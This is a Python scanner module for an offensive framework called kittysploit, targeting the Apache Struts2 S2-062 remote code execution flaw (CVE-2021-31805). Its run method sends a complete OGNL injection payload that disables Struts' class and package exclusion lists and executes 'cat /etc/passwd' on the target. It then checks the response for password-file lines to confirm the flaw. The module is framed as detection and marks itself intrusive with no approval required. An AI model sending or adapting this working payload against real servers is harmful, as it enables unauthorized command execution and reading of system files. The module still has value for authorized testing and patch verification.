#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Struts2 S2-062 is vulnerable to remote code execution."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Struts2 S2-062 - Remote Code Execution Detection',
        'description': "Apache Struts2 S2-062 is vulnerable to remote code execution. The fix issued for CVE-2020-17530 (S2-061) was incomplete, meaning some of the tag's attributes could still perform a double evaluation if a developer applied forced OGNL evaluation by using the %{...} syntax.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'apache', 'rce', 'struts', 'struts2', 'intrusive', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://cwiki.apache.org/confluence/display/WW/S2-062',
            'https://github.com/Axx8/Struts2_S2-062_CVE-2021-31805',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-31805',
            'http://www.openwall.com/lists/oss-security/2022/04/12/6',
            'https://security.netapp.com/advisory/ntap-20220420-0001/',
        ],
        'cve': 'CVE-2021-31805',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF'}, data='------WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Disposition: form-data; name="id"\n\n%{\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n(#request.map.setBean(#request.get(\'struts.valueStack\')) == true).toString().substring(0,0) +\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n(#request.map2.setBean(#request.get(\'map\').get(\'context\')) == true).toString().substring(0,0) +\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\n(#request.map3.setBean(#request.get(\'map2\').get(\'memberAccess\')) == true).toString().substring(0,0) +\n(#request.get(\'map3\').put(\'excludedPackageNames\',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\n(#request.get(\'map3\').put(\'excludedClasses\',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\n(#application.get(\'org.apache.tomcat.InstanceManager\').newInstance(\'freemarker.template.utility.Execute\').exec({\'cat /etc/passwd\'}))\n}\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF—\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Apache Struts2 S2-062 - Remote Code Execution detected', path=path)
            return True
        return False

